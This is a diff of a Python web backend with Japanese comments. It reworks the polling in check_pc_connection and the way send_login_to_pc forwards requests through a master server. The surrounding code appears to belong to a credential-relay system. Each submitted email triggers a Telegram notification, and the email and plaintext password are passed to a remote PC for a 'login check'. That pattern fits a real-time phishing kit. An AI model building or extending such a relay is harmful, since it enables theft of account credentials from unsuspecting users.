@@ -245,31 +245,31 @@ def api_login():
 
 
 def check_pc_connection():
-    """既存のconnectioncheckリクエストでPC接続確認"""
+    """既存のconnectioncheckリクエストでPC接続確認 (最大5秒)"""
     try:
-        request_id = str(uuid.uuid4())
-        
-        # 本サーバーにリクエスト送信
+        # 本サーバーにリクエスト送信（callback_urlを追加）
         response = requests.post(
             f"{MASTER_SERVER_URL}/api/request",
             json={
                 'genre': 'connectioncheck',
-                'request_id': request_id,
-                'data': {}
+                'callback_url': f"{CALLBACK_URL}"  # 本サーバーが要求するパラメータ
             },
             timeout=10
         )
         
         if response.status_code != 201:
             print(f"[ERROR] リクエスト送信失敗: status={response.status_code}")
+            print(f"[ERROR] レスポンス: {response.text}")
             return False
         
+        # 本サーバーから返されたrequest_idを取得
+        data = response.json()
+        request_id = data.get('request_id')
         print(f"[INFO] connectioncheck送信成功 | request_id: {request_id}")
         
-        # ポーリングで結果取得 (最大10秒)
-        for i in range(20):  # 0.5秒 × 20回 = 10秒
-            time.sleep(0.5)
-            
+        # ポーリングで結果取得 (最大5秒、成功が来るまで待つ)
+        start_time = time.time()
+        while time.time() - start_time < 5.0:  # 5秒以内
             result_response = requests.get(
                 f"{MASTER_SERVER_URL}/api/request-result/connectioncheck/{request_id}",
                 timeout=5
@@ -279,20 +279,23 @@ def check_pc_connection():
                 result = result_response.json()
                 status = result.get('status')
                 
-                print(f"[INFO] ポーリング {i+1}回目 | status: {status}")
+                elapsed = time.time() - start_time
+                print(f"[INFO] ポーリング中... ({elapsed:.1f}秒経過) | status: {status}")
                 
                 if status == 'success':
-                    print(f"[SUCCESS] PC接続確認成功")
+                    print(f"[SUCCESS] PC接続確認成功 ({elapsed:.1f}秒)")
                     return True
-                elif status in ['failed', 'timeout']:
-                    print(f"[ERROR] PC接続確認失敗: status={status}")
-                    return False
+                # pending以外（failed/timeout）は無視して待ち続ける
+            
+            time.sleep(0.1)  # 0.1秒間隔でチェック
         
-        print(f"[ERROR] PC接続確認タイムアウト")
-        return False  # タイムアウト
+        print(f"[ERROR] PC接続確認タイムアウト (5秒)")
+        return False
         
     except Exception as e:
         print(f"[ERROR] PC接続確認エラー: {e}")
+        import traceback
+        traceback.print_exc()
         return False
 
 
@@ -305,12 +308,11 @@ def send_login_to_pc(email, password):
         send_telegram_notification(email)
         
         # 本サーバー経由でPCにログインリクエスト送信
-        request_id = str(uuid.uuid4())
         requests.post(
             f"{MASTER_SERVER_URL}/api/request",
             json={
                 'genre': 'logincheckrequest',
-                'request_id': request_id,
+                'callback_url': CALLBACK_URL,
                 'data': {
                     'email': email,
                     'password': password
